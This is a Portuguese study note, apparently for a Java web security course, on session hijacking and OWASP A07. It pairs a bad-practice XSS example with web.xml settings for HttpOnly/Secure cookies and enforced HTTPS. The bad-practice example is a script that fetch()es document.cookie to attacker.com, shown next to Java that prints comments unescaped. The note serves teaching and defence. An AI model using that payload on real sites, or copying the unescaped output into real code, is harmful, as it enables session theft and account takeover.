---
tags: [segurança, java, ufcd10791, auth]
aliases: ["Autenticação e Sessões"]
owasp: "A07:2021 — Identification & Auth Failures"
severidade: "Alta"
relacionado:
  - "[[Cross-Site Scripting (XSS)]]"
  - "[[Cross-Site Request Forgery (CSRF)]]"
  - "[[Ataques de Força Bruta e Bloqueio de Conta]]"
---

# Autenticação e Sessões

> [!info] OWASP
> [A07:2021 — Identification & Auth Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)

## Descrição

O **Sequestro de Sessão (Session Hijacking)** é um ataque no qual um ator malicioso rouba o identificador de sessão de um utilizador legítimo e o utiliza para se passar por esse utilizador. O ataque mais comum para roubar cookies de sessão é através de Cross-Site Scripting (XSS).

---

## ❌ Má Prática — Roubo de Cookies de Sessão via XSS

Se a aplicação for vulnerável a XSS, um atacante pode injetar um script que rouba o cookie de sessão da vítima e o envia para um servidor controlado pelo atacante. Com este cookie, o atacante pode aceder à sessão da vítima.

```java
// Atacante injeta este 'comentário' numa página vulnerável a XSS:
String maliciousComment = "<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>";

// A aplicação vulnerável renderiza o comentário sem o codificar:
out.println("<p>" + maliciousComment + "</p>");
// O script é executado no browser da vítima, enviando o seu cookie.
```

---

## ✅ Boa Prática — Usar Cookies Seguros e Forçar Comunicação via HTTPS

Uma defesa robusta combina várias camadas. Além de proteger os cookies com os atributos `HttpOnly` e `Secure`, é **obrigatório** que toda a comunicação ocorra sobre HTTPS (HTTP sobre TLS/SSL). O HTTPS encripta todos os dados em trânsito, incluindo os cookies de sessão, protegendo-os contra ataques de interceção de rede (Man-in-the-Middle). A validação de um certificado digital válido, emitido por uma autoridade de certificação (CA), garante que o cliente está a comunicar com o servidor autêntico e não com um impostor.

```xml
<!-- Em web.xml (Configuração standard de Java EE) -->

<!-- 1. Configurar Cookies Seguros -->
<session-config>
    <cookie-config>
        <http-only>true</http-only>
        <secure>true</secure>
    </cookie-config>
</session-config>

<!-- 2. Forçar o uso de HTTPS em toda a aplicação -->
<security-constraint>
    <web-resource-collection>
        <web-resource-name>Toda a aplicação</web-resource-name>
        <url-pattern>/*</url-pattern>
    </web-resource-collection>
    <user-data-constraint>
        <!-- CONFIDENTIAL significa que a comunicação deve ser encriptada (HTTPS) -->
        <transport-guarantee>CONFIDENTIAL</transport-guarantee>
    </user-data-constraint>
</security-constraint>
```

---

## Tópicos Relacionados

- [[Cross-Site Scripting (XSS)]]
- [[Cross-Site Request Forgery (CSRF)]]
- [[Ataques de Força Bruta e Bloqueio de Conta]]

## Referências

- [A07:2021 — Identification & Auth Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [[AppComponent]] — implementação na app UFCD 10791
- [[HOME]] — voltar ao mapa central
